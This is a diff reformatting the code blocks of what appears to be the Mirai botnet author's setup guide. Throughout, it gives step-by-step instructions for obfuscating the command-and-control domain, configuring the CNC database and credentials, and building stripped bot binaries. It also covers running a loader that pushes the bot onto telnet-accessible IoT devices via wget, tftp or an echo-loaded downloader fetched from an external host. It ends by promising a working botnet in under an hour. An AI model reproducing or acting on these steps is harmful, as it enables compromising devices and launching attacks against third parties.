@@ -60,14 +60,15 @@ Bot has several configuration options that are obfuscated in (table.c/table.h). 
 In ./mirai/tools you will find something called enc.c - You must compile this to output things to put in the table.c file
 
 Run this inside mirai directory
-Code:
+```python
 ./build.sh debug telnet
+```
 You will get some errors related to cross-compilers not being there if you have not configured them. This is ok, won't affect compiling the enc tool
 
 Now, in the ./mirai/debug folder you should see a compiled binary called enc. For example, to get obfuscated string for domain name for bots to connect to, use this:
-Code:
+```python
 ./debug/enc string fuck.the.police.com
-
+```
 The output should look like this
 Code:
 XOR'ing 20 bytes of data...
@@ -75,14 +76,14 @@ XOR'ing 20 bytes of data...
 
 To update the TABLE_CNC_DOMAIN value for example, replace that long hex string with the one provided by enc tool. Also, you see "XOR'ing 20 bytes of data". This value must replace the last argument tas well. So for example, the table.c line originally looks like this
 
-[/code]
+```python
 add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
-[/code]
+```
 
 Now that we know value from enc tool, we update it like this
-Code:
+```python
 add_entry(TABLE_CNC_DOMAIN, "\x44\x57\x41\x49\x0C\x56\x4A\x47\x0C\x52\x4D\x4E\x4B\x41\x47\x0C\x41\x4D\x4F\x22​", 20); // fuck.the.police.com
-
+```
 Some values are strings, some are port (uint16 in network order / big endian).
 
 Configuring CNC
@@ -92,19 +93,19 @@ CNC requires database to work. When you install database, go into it and run fol
 http://pastebin.com/86d0iL9g
 
 This will create database for you. To add your user,
-Code:
+```python
 INSERT INTO users VALUES (NULL, 'anna-senpai', 'myawesomepassword', 0, 0, 0, 0, -1, 1, 30, '');
-
-Now, go into file ./mirai/cnc/main.go
+```
+Now, go into file `./mirai/cnc/main.go`
 
 Edit these values
 
-Code:
+```python
 const DatabaseAddr string   = "127.0.0.1"
 const DatabaseUser string   = "root"
 const DatabasePass string   = "password"
 const DatabaseTable string  = "mirai"
-
+```
 To the information for the mysql server you just installed
 
 
@@ -123,32 +124,36 @@ The CNC, bot, and related tools:
 How to build bot + CNC
 In mirai folder, there is build.sh script.
 
-Code:
+```python
 ./build.sh debug telnet
+```
 Will output debug binaries of bot that will not daemonize and print out info about if it can connect to CNC, etc, status of floods, etc. Compiles to ./mirai/debug folder
 
-Code:
+```python
 ./build.sh release telnet
+```
 Will output production-ready binaries of bot that are extremely stripped, small (about 60K) that should be loaded onto devices. Compiles all binaries in format: "mirai.$ARCH" to ./mirai/release folder
 
 
 Building Echo Loader
 Loader reads telnet entries from STDIN in following format:
-Code:
+```python
 ip:port user:pass
+```
 It detects if there is wget or tftp, and tries to download the binary using that. If not, it will echoload a tiny binary (about 1kb) that will suffice as wget. You can find code to compile the tiny downloader stub h ere
 http://santasbigcandycane.cx/dlr.src.zip
 
 You need to edit your main.c for the dlr to include the HTTP server IP. The idea is, if the iot device doesn have tftp or wget, then it will echo load this 2kb binary, which download the real binary, since echo loading really slow.
 When you compile, place your dlr.* files into the folder ./bins for the loader
 
-Code:
+```python
 ./build.sh
+```
 Will build the loader, optimized, production use, no fuss. If you have a file in formats used for loading, you can do this
 
-Code:
+```python
 cat file.txt | ./loader
-
+```
 Remember to ulimit!
 
 Just so it's clear, I'm not providing any kind of 1 on 1 help tutorials or shit, too much time. All scripts and everything are included to set up working botnet in under 1 hours. I am willing to help if you have individual questions (how come CNC not connecting to database, I did this this this blah blah), but not questions like "My bot not connect, fix it"
